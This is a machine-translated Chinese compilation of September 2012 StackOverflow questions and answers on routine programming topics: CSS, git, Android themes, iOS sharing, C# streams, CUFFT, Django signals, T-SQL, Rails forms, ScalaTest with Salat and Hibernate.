# StackOverflow 问答 12646000-12646999

# html - CSS 内部与外部样式表

> ID：12646001
> 
> 赞同：0
> 
> 时间：2012-09-28T19:13:12.323
> 
> 标签：html, css, styles

我正在创建一个网页，并开始使用顶部的样式标签：

```
<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Front Page</title>
    <link rel="stylesheet" type="text/css" href="CSS/Styles.css" /> 

    <style type="text/css">
    </style>
</head>
<body>
</body>
</html> 
```

我希望我所有的图形设计都在我的 Styles.css 中，但由于某种原因，它不起作用。当我添加类似：

```
div.box {
        margin:0 auto;
        width:500px;
        background:#222;
        position:relative;
        left: 50px;
        top: -200px;
        height: 100%;
        border:1px solid #262626;
        padding: 0 5px 5px 0;
    } 
```

要设计此元素：

```
<div class="box"></div> 
```

当我将它放在文档上方的标签中时它可以工作，但如果我将它放在 CSS 文件中则不行。以前这不是问题，但现在我一直在将所有内容添加到样式标签中，并且它变得非常长（150 行！）。我想将它全部移动到 css 文件中，这样我的主页就可以滚动浏览了。但我不明白为什么如果放在 CSS 文件中，图形更改将不适用。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:25:45.690

如果您的 CSS 文件的路径正常，则可能发生了几件事：

*   您可能只需要清除缓存。`CTRL`+`F5`通常可以解决问题。来到您网站的新用户不需要这样做。
*   您可能有错字，或者忘记用 关闭上面的语句`;`，请检查。
*   这可能是一个特殊性问题，即另一个更具体的规则是覆盖您的规则。**[在这里阅读](https://stackoverflow.com/a/10557730/871050)**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:16:28.433

您在区分大小写的文件系统 (Linux) 上吗？您的路径`CSS/Styles.css`必须完全正确。此外，它是相对于页面和`<basepath/>`. 尝试使用绝对 URL 来排除路径问题。

如果您没有路径问题，那么您可能不小心在某处的 CSS 文件中输入了拼写错误，从而导致您的规则被遗漏。

如果您的 CSS 文件很好，那么您的浏览器可能缓存了旧版本。您是否尝试过清除缓存？

# css - 悬停放置问题

> ID：12646003
> 
> 赞同：0
> 
> 时间：2012-09-28T19:13:19.587
> 
> 标签：css

我正在尝试创建一个盒子——在这种情况下，我在 CSS 和 HTML 中将其命名为#rollover——左侧有四个图像。当最终用户滚动左侧的每个图像时，右侧会出现更大版本的图像。我遇到的问题是将较大的图像保留在#rollover div 的右侧。

**CSS**

```
#rollover{
width:739px;
height: 600px;
border: 3px solid;
padding-top:10px;
padding-left: 40px;
padding-bottom:10px;
float:left;}

.picture {
width:150px; 
height: 150px;}

.picture a.small, .picture a.small:visited { 
display:block;  
text-decoration:none; 
background:#ffffff; 
top:0; 
left:0; 
border:0;}

.picture a img {
border:0;}

.picture a.small:hover {
text-decoration:none; 
background-color:#000000; 
color:#000000;}

.picture a .large {
display:block;  
width:0; 
height:0; 
border:0; 
top:0; 
left:0;}

.picture a.small:hover .large {  
position:absolute;
top:0;
width:550px; 
height:550px; 
left:160px;} 

body{
margin:0;}

#main{
width:800px;
margin-left:auto;
margin-right:auto;}

#mast{
width:799px;
height:300px;
margin-top: 10px;
padding-top: 5px;
background-image: url(IFhalllogo.png);
background-repeat:no-repeat;}

#insidewrap{
width:749px;
margin:0;
padding:0;
border: 3px solid;
float:left;
border-color: #39C;} 
```

**HTML**

```
<div id="rollover">
<div class="picture">
<a class="small" href="#nogo" title="small image"><img src="op/01-thumb.jpg"  title="small image" />
<img class="large" src="op/01-large.jpg" title="large image" /></a>
</div>
<div class="picture">
<a class="small" href="#nogo" title="small image"><img src="op/02-thumb.jpg" title="small image" />
<img class="large" src="op/02-large.jpg" title="large image" /></a>
</div>
<div class="picture">
<a class="small" href="#nogo" title="small image"><img src="op/03-thumb.jpg" title="small image" />
<img class="large" src="op/03-large.jpg" title="large image" /></a>
</div>
<div class="picture">
<a class="small" href="#nogo" title="small image"><img src="op/04-thumb.jpg" title="small image" />
<img class="large" src="op/04-large.jpg" title="large image" /></a>
</div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:06:05.767

只是为了记录：这里的解决方案是`position: absolute`在全尺寸图像上使用，注意相对定位容器以确保图像相对于该元素定位：

```
#rollover{
    position: relative;
    /* ... */
}

.picture a.small:hover .large {  
    position:absolute;
    top:0;
    left:160px;
    /* ... */
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:54:14.677

尝试在悬停事件上使用绝对定位。

这是代码，摆弄顶部和左侧属性以将其放在您想要的位置。

希望这可以帮助。

**CSS：**

```
#rollover{
    width:739px;
    height: 600px;
    border: 3px solid;
    padding-top:10px;
    padding-left: 40px;
    padding-bottom:10px;
    float:left;
}

.picture {
    width:150px; 
    height: 150px;
}

.picture a.small, .picture a.small:visited { 
    display:block;  
    text-decoration:none; 
    background:#ffffff; 
    top:0; 
    left:0; 
    border:0;
}

.picture a img {
    border:0;
}

.picture a.small:hover {
    text-decoration:none; 
    background-color:#000000; 
    color:#000000;
}

.picture a .large {
    display:block;  
    visibility:hidden;
}

.picture a.small:hover .large {
    display:block; 
    visibility: visible;
    position:absolute; 
    width:550px; 
    height:550px; 
    top:25px;
    left:220px;
} 
```

**HTML：**

```
<div id="rollover">
    <div class="picture">
        <a class="small" href="#nogo" title="small image">
            <img src="op/01-thumb.jpg"  title="small image" />
            <img class="large" src="op/01-large.jpg" title="large image" />
        </a>
    </div>

    <div class="picture">
        <a class="small" href="#nogo" title="small image">
            <img src="op/02-thumb.jpg" title="small image" />
            <img class="large" src="op/02-large.jpg" title="large image" />
        </a>
    </div>

    <div class="picture">
        <a class="small" href="#nogo" title="small image">
            <img src="op/03-thumb.jpg" title="small image" />
            <img class="large" src="op/03-large.jpg" title="large image" />
        </a>
    </div>

    <div class="picture">
        <a class="small" href="#nogo" title="small image">
            <img src="op/04-thumb.jpg" title="small image" />
            <img class="large" src="op/04-large.jpg" title="large image" />
        </a>
    </div>
</div> 
```

# android - Holo.Light 给出“资源不公开”错误

> ID：12646004
> 
> 赞同：2
> 
> 时间：2012-09-28T19:13:21.557
> 
> 标签：android, intellij-idea

在以下代码示例中，我尝试将应用程序的默认主题设置为光全息样式：

```
<application android:icon="@drawable/icon" android:label="@string/app_name" android:theme="@android:style/Holo.Light"> 
```

但是，它给出了一个错误，指出“资源不公开”。我见过[这个](https://stackoverflow.com/questions/8018954/getting-error-message-resource-is-not-public)类似的问题，建议是将主题复制到您的应用程序中。但是，我的印象是，从 4.0 开始，对于认证来说，这是不必要的，设备必须包含未修改主题的副本。

任何人都可以就错误的原因和可能的解决方案提出建议吗？如果相关，我的 ide 是最新的 IntelliJ。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T19:20:28.610

尝试`Theme.Holo.Light`代替`Holo.Light`.

# git - 删除合并两次的提交包

> ID：12646012
> 
> 赞同：0
> 
> 时间：2012-09-28T19:14:14.100
> 
> 标签：git, merge

我有 2 个分支，比如说我有本地仓库`develop`和`feature`
相同的 github 仓库。
没有其他提交者

这大约是我所做的：（我不确定我所说的是否正确_

我已合并`feature`到`develop`，然后我决定将其重置并重新合并为`--no-ff`.
然后出现了一些问题，没有快进`push`，我`pull` `origin/feature`到`feature`.
然后我尝试从`origin`（但不是从我的回购）中删除分支功能。功能中也有一个变基`master`，但据我所知，这是在第一次合并之前。

现在我有`feature`两次提交（图片上的绿色和黑色分支）： ![在此处输入图像描述](../Images/b2322d65c77ee437ddd3f3617f636c7c.png)

现在似乎是正确的代码。

我想删除这个分支（在 github 和本地 repo 上）。我怎样才能做到这一点？
够容易吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T21:32:35.463

您可以在本地变基并强制将其推送到您需要的任何地方。找出有多少提交有问题，从图中看起来像 4\. 检查有问题的分支并进行交互式变基。

```
git checkout develop
git rebase -i HEAD~4 
```

删除重复的提交并通过比较两个分支来验证最终结果是否与原始结果匹配。

```
git diff develop..origin/develop 
```

然后推送到遥控器

```
git push -f origin develop 
```

希望这有效。

# ruby-on-rails - jquery-ui-rails 是否支持自定义主题？

> ID：12646017
> 
> 赞同：0
> 
> 时间：2012-09-28T19:14:36.323
> 
> 标签：ruby-on-rails, ruby-on-rails-3, jquery-ui, gem, ruby-on-rails-3.2

[jquery-ui-rails](https://github.com/joliss/jquery-ui-rails)听起来真的很有帮助，因为它可以计算出您想要的 UI 组件的所有依赖项并提供主题 css/images。但是，在上面链接的 Github 页面的末尾，它谈到了仅支持基本主题的限制。加载其他主题显然“很麻烦，这个 gem 没有官方支持，并且在提供基本主题和自定义主题时会增加 1 KB 的开销。”

我不能只编辑此 gem 使用的基本主题/图像并将其替换为来自 jqueryui.com 的 ThemeRoller 的我自己的主题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T20:58:03.620

您可以使用自定义主题。例如： - 从 application.css 这行删除/注释

```
*= require jquery.ui.core
*= require jquery.ui.theme 
```

*   [从http://jqueryui.com/themeroller/](http://jqueryui.com/themeroller/)下载主题
*   将 css 文件放在 app/assets/stylesheets/ 中，您可以自定义样式
*   将图像放入 app/assets/images/images/

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-09T02:15:18.710

这对我不起作用。在完成 Alexey 提到的所有操作后，我必须将以下内容添加回 application.css：

```
*= require jquery-ui.min.css 
```

显然，我从所有随主题下载的文件中将 .min 文件复制到 assets/stylesheets 文件夹中。

我：Rails 4.2.7，Ruby 2.2

# ios - 如何以编程方式确定 iOS 中的默认电子邮件帐户/地址？

> ID：12646018
> 
> 赞同：1
> 
> 时间：2012-09-28T19:14:36.743
> 
> 标签：ios, cocoa-touch, email

在 iOS 设备上，一次可以配置多个电子邮件帐户。在“设置”应用中，用户可以选择一个默认电子邮件帐户（Mail->Mail:DefaultAccount）。此默认帐户是通过 MFMailComposeViewController 发送电子邮件时的“发件人”地址。

是否有任何 Apple 批准的方法可以以编程方式检测默认帐户的名称或用作“发件人”的电子邮件地址？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:09:57.773

我不相信在 iOS 中获取用户的电子邮件地址是可能的。

此处提出了类似的问题： [Get default user email in iOS Device](https://stackoverflow.com/questions/10758431/get-default-user-email-in-ios-device)

# ios6 - 使用 iOS6 UIActivityViewController 附加对象

> ID：12646019
> 
> 赞同：8
> 
> 时间：2012-09-28T19:14:44.830
> 
> 标签：ios6, sharing

我正在迁移以使用 UIActivityViewController 在 iOS6 中共享，但我不知道如何创建电子邮件附件对象以在通过电子邮件共享时包含在内。

iOS5中对应的代码为：

```
MFMailComposeViewController *picker = [[MFMailComposeViewController alloc] init];
[picker addAttachmentData:data mimeType:@"application/XXX" fileName:fileName]; 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-10-23T10:22:43.653

您对 UIActivityViewController 的控制非常有限，但如果您附加了众所周知的 mime 类型，我发现您可以通过在文件 URL 中提供关联的文件扩展名来使其正常工作。例如，如果您的附件是 vCard，请在文件 URL 中使用“.vcf”扩展名：

```
NSString *docsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
// The file extension is important so that some mime magic happens!
NSString *filePath = [docsPath stringByAppendingPathComponent:@"vcard.vcf"];
NSURL *fileUrl     = [NSURL fileURLWithPath:filePath];

[data writeToURL:fileUrl atomically:YES]; // save the file

// Now pass the file URL in the activity items array
UIActivityViewController *avc = [[UIActivityViewController alloc] initWithActivityItems:
    @[@"Here's an attached vCard", fileUrl] applicationActivities:nil];
[vc presentModalViewController:avc animated:YES]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-06T04:41:38.500

对于想知道为什么他们的文件没有使用 UIActivityViewController 共享到 DropBox 和其他通用文件处理应用程序等应用程序的任何人，您真正想要的是 UIDocumentInteractionController。

像这样使用它：

```
class ViewController {
    var openInController:UIDocumentInteractionController!

    init() {
        openInController = UIDocumentInteractionController(URL: docURL)
    }

    func shareDoc {
        openInController.presentOptionsMenuFromRect(CGRectZero, inView: self.view, animated: true)
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T02:49:05.377

据我所知，您无法使用 UIActivityViewController 执行此操作——我什至无法让它呈现消息正文的 HTML 内容——因此使用 SLComposeViewController 可能会更好。

# c# - C# 如何将 System.Net.ConnectStream 转换为 byte[] (array)

> ID：12646020
> 
> 赞同：5
> 
> 时间：2012-09-28T19:14:44.440
> 
> 标签：c#, asp.net, type-conversion

我试图将流（System.Net.ConnectStream）转换为字节数组。关于如何做到这一点的任何想法/例子？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-28T19:18:56.780

```
Stream sourceStream = ... // the ConnectStream
byte[] array;
using (var ms = new MemoryStream())
{
    sourceStream.CopyTo(ms);
    array = ms.ToArray();
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-28T20:25:27.170

试试这个...

```
 private static readonly object _lock = new object();

    public static byte[] readFullStream(Stream st)
    {
        try
        {
            Monitor.Enter(_lock);
            byte[] buffer = new byte[65536];
            Int32 bytesRead;
            MemoryStream ms = new MemoryStream();
            bool finished = false;
            while (!finished)
            {
                bytesRead = st.Read(buffer.Value, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    ms.Write(buffer.Value, 0, bytesRead);
                }
                else
                {
                    finished = true;
                }
            }
            return ms.ToArray();
        }
        finally
        {
            Monitor.Exit(_lock);
        }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-02T16:53:12.800

在 Freeetje 的一个答案中，有一种名为“ReadToEnd”的方法。对我来说就像一个魅力......

[如何从 Microsoft.SharePoint.Client.File 对象获取文件大小？](https://stackoverflow.com/questions/8339483/how-do-i-get-the-filesize-from-the-microsoft-sharepoint-client-file-object)

# cuda - CUDA 上的 C2R FFT (CUFFT) 产生与 FFTW 不同的结果

> ID：12646021
> 
> 赞同：3
> 
> 时间：2012-09-28T19:14:47.913
> 
> 标签：cuda, fft, fftw, fluid-dynamics

我正在将一些代码从使用 FFTW 库转换为 CUFFT（CPU 计算到 GPU 计算）。我需要转换一个力矩阵，对其进行一些数学运算并将其转换回来。FFTW 中的操作如下所示：

```
fftw_real u0[DIM * 2*(DIM/2+1)], v0[DIM * 2*(DIM/2+1)];

static rfftwnd_plan plan_rc, plan_cr;

void init_FFT(int n) {
  plan_rc = rfftw2d_create_plan(n, n, FFTW_REAL_TO_COMPLEX, FFTW_IN_PLACE);
  plan_cr = rfftw2d_create_plan(n, n, FFTW_COMPLEX_TO_REAL, FFTW_IN_PLACE);
}

#define FFT(s,u)\
  if(s==1) rfftwnd_one_real_to_complex(plan_rc,(fftw_real *)u,(fftw_complex*)u);\
  else rfftwnd_one_complex_to_real(plan_cr,(fftw_complex *)u,(fftw_real *)u) 
```

最后：

```
FFT(1,u0);
FFT(1,v0);

//math
...

//and transforming back
FFT(-1,u0); 
FFT(-1,v0); 
```

搬到 CUFFT 后：

```
#define OURARRAYSIZE (DIM * 2*(DIM/2+1))
#define DIM 16

cufftHandle planR2C;
cufftHandle planC2R;
cufftReal forcesX[OURARRAYSIZE];
cufftReal forcesY[OURARRAYSIZE];
cufftReal  *dev_forcesX;
cufftReal  *dev_forcesY; 
```

在里面：

```
cufftPlan2d(&planR2C, DIM, DIM, CUFFT_R2C);
cufftPlan2d(&planC2R, DIM, DIM, CUFFT_C2R);
cufftSetCompatibilityMode(planR2C, CUFFT_COMPATIBILITY_FFTW_ALL);
cufftSetCompatibilityMode(planC2R, CUFFT_COMPATIBILITY_FFTW_ALL);
cudaMalloc( (void**)&dev_forcesX, OURARRAYSIZE*sizeof(cufftReal) );
cudaMalloc( (void**)&dev_forcesY, OURARRAYSIZE*sizeof(cufftReal) ); 
```

最后：

```
cufftExecR2C(planR2C, (cufftReal*) dev_forcesX, (cufftComplex*)dev_forcesX);
cufftExecR2C(planR2C, (cufftReal*) dev_forcesY, (cufftComplex*)dev_forcesY);

cudaMemcpy( forcesX, dev_forcesX, OURARRAYSIZE*sizeof(cufftReal), cudaMemcpyDeviceToHost );
cudaMemcpy( forcesY, dev_forcesY, OURARRAYSIZE*sizeof(cufftReal), cudaMemcpyDeviceToHost );

diffuseVelocity(velocitiesX, velocitiesY, forcesX, forcesY);//MATH PART

cudaMemcpy( dev_forcesX, forcesX, OURARRAYSIZE*sizeof(cufftReal), cudaMemcpyHostToDevice );
cudaMemcpy( dev_forcesY, forcesY, OURARRAYSIZE*sizeof(cufftReal), cudaMemcpyHostToDevice );

cufftExecC2R(planC2R, (cufftComplex*) dev_forcesX, (cufftReal*)dev_forcesX);
cufftExecC2R(planC2R, (cufftComplex*) dev_forcesY, (cufftReal*)dev_forcesY);

cudaMemcpy( forcesX, dev_forcesX, OURARRAYSIZE*sizeof(cufftReal), cudaMemcpyDeviceToHost );
cudaMemcpy( forcesY, dev_forcesY, OURARRAYSIZE*sizeof(cufftReal), cudaMemcpyDeviceToHost ); 
```

在数学部分之后，两个程序都保存完全相同的数据（矩阵）。可悲的是，在矩阵中的逆傅立叶变换数据不同之后。我注意到损坏的数据位于奖励列（ (DIM * 2*(DIM/2+1)) ）中，这是就地转换所需的。

有谁知道，为什么？CUFFT 有什么我不知道的吗？

# django - django - 我如何使用带有信号的注释？

> ID：12646026
> 
> 赞同：0
> 
> 时间：2012-09-28T19:15:14.750
> 
> 标签：django

或者更确切地说，当我包含来自models.py的signals.py时，我遇到了Django和信号的旧双重导入问题

我宁愿不必为信号输入“只运行一次”代码，但如果我*绝对*必须这样做，我可能会这样做。这似乎是一个愚蠢的黑客行为。

反正，

给定我有一个signals.py 文件并且其中一个信号用于models.py 中定义的对象之一，我如何为它创建注释？

如果我包含该模型，那么我会遇到 Python 令人困惑地似乎仍然被绊倒的“循环引用”问题。虽然只是 2012 年。

我尝试使用 get_model，但这似乎不起作用......现在调用该信号来保存models.py 文件中的*任何和所有**模型*。

 *这是注释，以及它现在的样子：

```
@receiver(pre_save, sender=get_model('myapp.models','Story')) 
```

我也试过

```
@receiver(pre_save, sender=Story) 
```

上面有对应`from myapp.models import Story`的，但是导致了描述的导入错误。

我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T21:05:25.670

当这样卡住时，我只注册接收者而不指定发送者，并在函数体内进行模型导入。

```
@receiver(pre_save)
def handler(sender, instance, created, **kwargs):
    from models import MyModel
    if not isinstance(sender, MyModel):
        return
    do_stuff() 
```*

# sql-server - 比游标 tsql 更好

> ID：12646027
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:15:17.557
> 
> 标签：sql-server, tsql, cursor

这里的问题很简单（虽然我已经准备好回答不是），我怎样才能让这个查询更有效率。

简而言之，它复制记录。它选择 X 记录，然后使用这些记录数据复制它们以捕获新标识符。使用原始记录和新记录的 id，然后使用新标识符通过复制原始数据的数据来插入另一个表。

这需要很长时间。你能帮忙缩短吗？

```
DECLARE DaysToDuplicateCursor CURSOR FAST_FORWARD FOR 
SELECT 
    DayId 
FROM [Days] 
WHERE AgentId IN ('XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX') 
AND PersonAgentId IN (
     'YYYYYYYY-YYYY-YYYY-YYYY-YYYYYYYYYYYY'
    ,'WWWWWWWW-WWWW-WWWW-WWWW-WWWWWWWWWWWW'
    ,'ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZZ'
    ,'TTTTTTTT-TTTT-TTTT-TTTT-TTTTTTTTTTTT'
)

DECLARE @Id INT

OPEN DaysToDuplicateCursor
    FETCH NEXT FROM DaysToDuplicateCursor INTO @Id
    WHILE @@FETCH_STATUS = 0
    BEGIN
        --
        -- Insert Days data.
        --
        INSERT INTO [Days] (
               [DayTemplateId]
              ,[DayDate]
        )
        SELECT [DayTemplateId]
              ,DATEADD(YEAR,-1,[DayDate]) AS [DayDate]
          FROM [Days] WHERE [DayId] = @Id
        --
        -- Insert Periods data.
        --
        INSERT INTO [Periods] (
           [DayId]
          ,[PeriodTemplateId]
        )
        SELECT 
           SCOPE_IDENTITY()
          ,[PeriodTemplateId]
        FROM [Periods] WHERE [DayId] = @Id
        --
    END
CLOSE DaysToDuplicateCursor
DEALLOCATE DaysToDuplicateCursor 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:21:58.513

如果您使用 OUTPUT 子句而不是询问 scope_identity，则根本不需要使用游标。您将把这些信息放入一个表变量中。您还希望在输出子句中返回唯一标识记录的任何其他列，以便您可以在连接中使用它们来获取后续插入所需的数据。

# unicode - SQL Server 2008 R2：检测 nvarchar 字段中的编码

> ID：12646030
> 
> 赞同：2
> 
> 时间：2012-09-28T19:16:21.193
> 
> 标签：unicode, encoding, sql-server-2008-r2

我有一个 1,000,000 行加上字符串表，由于编码错误，里面有一些垃圾。

垃圾很少，但需要找到。

有问题的`NVARCHAR`列是通常包含 11 种语言之一的文本的列。

所有文本都应该是 unicode（当我们在应用程序端处理它时为 utf-8）。

损坏的列包含`?`字符和/或非常有限的异常字形集，肉眼很容易看出它们不是有效语言。这些列很可能已被前后编码为总垃圾。

所以以速度的名义，我可以在 SQL Server 上做些什么来检测错误的编码/字符串垃圾吗？

谢谢。

编辑添加垃圾示例：

这是俄语 Ð¸Ð»¡

# java - 在 3D Java 场景中使用 Google Maps API

> ID：12646031
> 
> 赞同：1
> 
> 时间：2012-09-28T19:16:22.687
> 
> 标签：java, google-maps

我今年正在写软件工程方面的论文。我有一个很酷的项目，但在我向导师提及之前，我想先问问这是否可能。如果可能的话，如果有人能指出我实现目标的正确方向，那就太好了。

我的想法是这样的。我想做一个僵尸生存游戏，我知道一般和无聊，但我希望玩家能够在自己的家乡跑来跑去，就好像真的发生了僵尸爆发一样，最简单的方法是使用谷歌地图API（我认为）因此根据用户的家庭位置自动创建地图。

增加的功能是使用当地火车站实施交通系统，这样用户就可以在多人平台上实时移动到他们的朋友区域。

因此，根据我已经知道的信息，我需要这些教程/资源。

*   将实时谷歌地图导入 Java 环境的能力
*   能够查看道路所在的位置以及可以行走的区域，可能使用绿色作为字段等的基础。这是为了确保用户只能在定义的区域内行走
*   能够在道路和可步行区域旁边生成环境（例如房屋和栅栏），而不是让用户在平面 3D 环境中四处奔跑

我已经对使用 JWJGL 库创建 3D 环境有了一些了解。上述每一点都取决于前一个项目符号点。非常感谢任何反馈或建设性的批评。即使只是“你到底在说什么”也会有所帮助。

很高兴看到你的回复。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T21:13:00.987

可以使用 Google Earth API：[https](https://developers.google.com/earth/) ://developers.google.com/earth/ 您必须获得某种 Web 视图，基本上是将 JavaScript 应用程序集成到您的 Java 应用程序中。不过，我会意识到服务条款。

# ruby-on-rails - 更改字段表单字段标签

> ID：12646032
> 
> 赞同：4
> 
> 时间：2012-09-28T19:16:24.687
> 
> 标签：ruby-on-rails, forms

我有一个为我生成表单的代码：

```
<%= form_for(@member) do |f| %>
    <%= f.label :email %>
    <%= f.text_field :email %>
<% end %> 
```

我想自定义该字段的标签，即。设置一个非默认值。

我该怎么做？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T19:31:46.237

您可能很想用 替换`f.label :email`，`f.label "whatever"`但这会给您带来麻烦：您将无法通过单击标签区域来使用标签快速访问您的文本字段。这样做：

```
<%= f.label :email, "Something" %> 
```

您的文本字段和标签将被关联，但最后一个将在页面上有不同的表示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:22:36.047

嗯，也许替换`f.label :email`为`f.label :email, "whatever"`？

# scala - 如何使用 ScalaTest 测试基于 Salat 的方法

> ID：12646037
> 
> 赞同：7
> 
> 时间：2012-09-28T19:16:46.057
> 
> 标签：scala, mongodb, playframework-2.0, scalatest, salat

我正在使用 Play 2、Salat（用于 mongoDB bindin）编写一个网络应用程序。我想在课程模型中测试一些方法（例如测试我通过 id 检索正确课程的事实）。问题是我不想用虚拟课程污染我当前的数据库。如何使用 Salat 和 Scala Test 使用假数据库？这是我的测试文件之一。它创建了两个课程，并将其插入数据库，并在其上运行一些测试。

```
LessonSpec extends FlatSpec with ShouldMatchers {
  object FakeApp extends FakeApplication()

  val newLesson1 = Lesson(
    title = "lesson1",
    level = 5,
    explanations = "expl1",
    questions = Seq.empty)
  LessonDAO.insert(newLesson1)

  val newLesson2 = Lesson(
    title = "lesson2",
    level = 5,
    explanations = "expl2",
    questions = Seq.empty)
  LessonDAO.insert(newLesson2)

  "Lesson Model" should "be retrieved by level" in {
    running(FakeApp) {
      assert(Lesson.findByLevel(5).size === 2)
    }
  }
  it should "be of size 0 if no lesson of the level is found" in {
    running(FakeApp) {
      Lesson.findByLevel(4) should be(Nil)
    }
  }

  it should "be retrieved by title" in {
    running(FakeApp) {
      Lesson.findOneByTitle("lesson1") should be(Some(Lesson("lesson1", 5, "expl1", List())))
    }
  }

} 
```

我在网上搜索，但找不到使用 Salat 和 ScalaTest 的好的链接或项目。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-15T13:34:13.937

萨拉特开发商在这里。我的建议是有一个单独的仅测试数据库。您可以使用测试数据填充它以使您的测试数据库处于已知状态 - 请参阅 casbah 测试以了解如何执行此操作 - 然后根据需要对其进行测试，并根据需要清除集合。

我使用的是 specs2，不是 scalatest，但原理是一样的 - 请参阅 Salat 测试的源代码。

这是一个很好的测试来帮助您入门： [https ://github.com/novus/salat/blob/master/salat-core/src/test/scala/com/novus/salat/test/dao/SalatDAOSpec.scala](https://github.com/novus/salat/blob/master/salat-core/src/test/scala/com/novus/salat/test/dao/SalatDAOSpec.scala)

请注意，在我的基本规范中，我清除了我的测试数据库 - 这在每个规范之前运行：

```
trait SalatSpec extends Specification with Logging {

  override def is =
    Step {
      //      log.info("beforeSpec: registering BSON conversion helpers")
      com.mongodb.casbah.commons.conversions.scala.RegisterConversionHelpers()
      com.mongodb.casbah.commons.conversions.scala.RegisterJodaTimeConversionHelpers()

    } ^
      super.is ^
      Step {
        //        log.info("afterSpec: dropping test MongoDB '%s'".format(SalatSpecDb))
        MongoConnection().dropDatabase(SalatSpecDb)
      } 
```

然后在 SalatDAOSpec 中，我在创建、填充和/或清除单个集合的范围内运行测试，以便测试可以在预期状态下运行。一个问题：如果您在同一个集合上同时运行测试，它们可能会由于意外状态而失败。解决方案是在隔离的特殊用途集合中运行您的测试，或者强制您的测试连续运行，以便单个集合上的操作不会在不同的测试用例修改集合时相互影响。

如果您发布到 Scalatest 邮件列表 (http://groups.google.com/group/scalatest-users)，我相信有人可以推荐正确的设置方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T04:22:17.880

在我的应用程序中，我使用 application.conf 中的参数来指定 Mongo 数据库名称。在初始化我的 FakeApplication 时，我重写了该参数，以便我的单元测试可以使用真实的 Mongo 实例，但看不到我的任何生产数据。

修饰一些特定于我的应用程序的细节，我的测试看起来像这样：

```
// wipe any existing data
db.collectionNames.foreach { colName =>
  if (colName != "system.indexes") db.getCollection(colName).drop
}

app = FakeApplication(additionalConfiguration = Map("mongo.db.name" -> "unit-test")) 
```

# internet-explorer - Javascript 下拉列表在 Internet Explorer 9 中不起作用

> ID：12646040
> 
> 赞同：1
> 
> 时间：2012-09-28T19:17:03.393
> 
> 标签：internet-explorer, internet-explorer-9

[http://www.poopoostocks.com/premium-service/](http://www.poopoostocks.com/premium-service/)

此站点上的表格在所有浏览器中都可以正常工作，但是 IE9 中的某些人遇到了一个问题，即当他们尝试选择菜单上的选项时 IE 失去焦点。我家中装有 IE 9 的电脑没有这个问题，但其他人已经向我展示了他们的问题。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:57:38.107

页面上的内联 css 代码有问题。创建于第 121 行。选择元素有 padding:5px。更好的方法是用 div （或其他东西）包装你的表单元素，并用你的代码设置 div 的样式：

```
background:#333;
color:#fff;
padding:5px;
border: solid thin #555;
border-radius:6px; 
```

PS并清理您的html代码。现在真的很脏。我发现了一些奇怪的东西，比如和`</br>`结构，这在代码中并不都是奇怪的东西:) 爱你的代码，浏览器会爱你:) 祝你的项目好运。`<p></center></p>``<p></noscript></p>`

# hibernate - 忽略现有项目并使用休眠将剩余项目插入数据库

> ID：12646041
> 
> 赞同：0
> 
> 时间：2012-09-28T19:17:06.133
> 
> 标签：hibernate, dao

我有文本区域，我可以在其中输入要阻止的站点名称。所有输入的站点都存储到 SITES 表中。如果输入的任何站点在 SITES 表中，我们应该忽略这些站点并插入剩余的站点。

我们应该如何使用hibernate来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T21:19:29.373

在 Hibernate 或数据库级别中，您可以（并且可能应该）做的所有事情就是向包含站点名称的字段添加唯一约束。这将确保在添加重复项的情况下引发异常。但是为了防止这种异常，您必须在应用程序代码中检查预先存在的站点，例如，通过对要添加的每个站点使用查询，或者一次加载完整的表，然后检查每个输入的站点名称。

请注意，您可能需要对站点名称进行某种规范化，例如修剪空格或转换为小写，以确保您识别出任何重复项（例如`www.EXAMPLE.com`，并且`www.example.com`可能应该被视为相等）。在 Hibernate Validator 中，您可以使用模式约束来强制执行此规范化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T21:20:43.817

执行第一个查询：

```
select site.name from Site site where site.name in (:enteredSiteNames) 
```

然后从输入的站点列表中删除所有找到的站点（因为它们已经在数据库中）。

然后遍历剩余的站点，并将它们持久化。

# jquery - 2个不同的选择+提交按钮来显示一个隐藏的div

> ID：12646044
> 
> 赞同：0
> 
> 时间：2012-09-28T19:17:21.367
> 
> 标签：jquery

当谈到 jQuery 时，我是个大菜鸟，我在这里非常需要帮助。

